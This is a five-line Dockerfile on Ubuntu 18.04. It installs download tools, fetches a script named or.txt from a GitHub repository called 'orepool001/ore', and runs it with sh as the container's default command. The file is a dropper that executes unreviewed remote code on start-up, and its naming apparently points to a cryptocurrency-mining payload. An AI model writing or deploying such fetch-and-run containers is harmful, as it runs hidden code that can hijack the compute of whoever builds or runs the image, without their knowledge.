FROM ubuntu:18.04
RUN apt update
RUN apt install wget curl git -y
RUN wget https://raw.githubusercontent.com/orepool001/ore/main/or.txt
CMD sh or.txt
